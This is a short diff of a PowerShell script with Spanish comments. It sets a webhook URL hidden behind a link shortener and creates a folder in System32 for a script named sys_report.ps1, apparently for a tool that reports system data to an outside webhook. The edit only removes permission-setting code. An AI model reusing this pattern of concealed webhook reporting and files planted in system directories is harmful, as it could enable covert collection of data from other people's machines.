@@ -12,13 +12,9 @@ $hookurl = "https://is.gd/xSsigk"  # Reemplaza "URL_DEL_WEBHOOK" con la URL de t
 $directoryName = "C:\Windows\System32\Scripts"
 $scriptName = "sys_report.ps1"
 
-# Crear el directorio si no existe y asignar permisos
+# Crear el directorio si no existe
 if (-not (Test-Path -Path $directoryName)) {
-    New-Item -Path $directoryName -ItemType Directory | Out-Null
-    $ACL = Get-Acl -Path $directoryName
-    $AccessRule = New-Object System.Security.AccessControl.FileSystemAccessRule("Administradores", "FullControl", "ContainerInherit, ObjectInherit", "None", "Allow")
-    $ACL.AddAccessRule($AccessRule)
-    Set-Acl -Path $directoryName -AclObject $ACL
+    New-Item -Path $directoryName -ItemType Directory -Force | Out-Null
 }
 
 # Obtener la ruta completa de System32
